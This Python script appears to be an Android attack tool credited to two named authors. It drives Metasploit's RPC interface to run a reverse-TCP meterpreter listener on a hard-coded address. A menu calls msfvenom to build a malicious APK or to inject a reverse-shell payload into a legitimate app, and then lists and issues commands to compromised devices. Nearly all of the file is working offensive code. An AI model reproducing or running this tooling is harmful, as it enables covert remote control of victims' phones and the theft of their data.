import os
from pymetasploit3.msfrpc import MsfRpcClient
import threading
from pynput import keyboard

client = MsfRpcClient('12345678', port=6565)
exploit = client.modules.use('exploit', 'multi/handler')
payload = client.modules.use('payload', 'android/meterpreter/reverse_tcp')
payload['LHOST'] = "192.168.57.13"
payload['LPORT'] = "6565"
exploit.execute(payload=payload)
print("Our tool started listening")
# execute above details
def restart_session():
    def on_press(key):
        if key == keyboard.Key.shift:
            print("Shift pressed - restarting session...")
            interact_with_session()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
def interact_with_session():
    try:

        session_id = input("Enter the session ID: ")
        session = client.sessions.session(session_id)
        print(f"Interacting with session {session_id}")
    except Exception as e:
        main()
    # Start listener thread for shift key
    threading.Thread(target=restart_session, args=(), daemon=True).start()

    while True:

        try:

            command = input("meterpreter> ")
            if command.lower() == "exit":
                break
            else:
                output = session.run_with_output(command)
                print(output)
        except Exception as e:
            print("")
def main():
    # first i make the asciart with https://www.asciiart.eu/text-to-ascii-art
    ascii_art = """
    ****************************************************************************************************
    *  _   _ _   _ _____     _______ ____  ____ ___ _______   __   ___  _____   _  ___   _ _____ _     *
    * | | | | \ | |_ _\ \   / / ____|  _ \/ ___|_ _|_   _\ \ / /  / _ \|  ___| | |/ / | | |  ___/ \    *
    * | | | |  \| || | \ \ / /|  _| | |_) \___ \| |  | |  \ V /  | | | | |_    | ' /| | | | |_ / _ \   *
    * | |_| | |\  || |  \ V / | |___|  _ < ___) | |  | |   | |   | |_| |  _|   | . \| |_| |  _/ ___ \  *
    *  \___/|_| \_|___|  \_/  |_____|_| \_\____/___| |_|   |_|    \___/|_|     |_|\_\\___/|_|/_/   \_\ *
    ****************************************************************************************************
                             by Dr.Salah Abd Alhadi  & Mohammad Abbas Shareef
    """
    #then print it
    print(ascii_art)
    #two primary veriable will setting in (choose number 1)
    lhost = "192.168.57.13"
    lport = "6565"
    #our sesions with metasploit set when Start Metasploit listener (choose number 2)


    while True:
        print("\nPlease choose an option:")
        print("1. Set your host and port")
        print("2. Generate APK payload")
        print("3. Inject APK payload")
        print("4. List active sessions")
        print("5. Interact with a session")
        print("6. Exit")
        choice = input("\nEnter your choice: ")

        if choice == '1':
            lhost = input("Enter your host ")
            lport = input("Enter your port")
            print("your host :",lhost)
            print("your port :",lport)

        elif choice == '2':
                #we use msfvenom tool to generate apk
                fname = input("enter name of file with .apk")
                os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {fname}")

        elif choice == '3':
            original_apk = input("Enter original APK path and name (with .apk): ")
            output_apk = input("Enter output APK path and name (with .apk): ")
            if lhost and lport:
                os.system(f"msfvenom -x {original_apk} -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_apk}")
                print(f"Injected payload into {original_apk} and saved as {output_apk}")
            else:
                print("Please set LHOST and LPORT first (option 1).")

        elif choice == '4':
            sessions = client.sessions.list
            if not sessions:
                print("there are not active sessions found")
            else:
                print("active session ")
                for session_id, details in sessions.items():
                    print(f"id- {session_id}, device-: {details['info']}")

        elif choice == '5':

            interact_with_session()
        elif choice == '6':

            print("Good bye")
           # break

        else:
            print("please choise correct one")


if __name__ == "__main__":
    main()
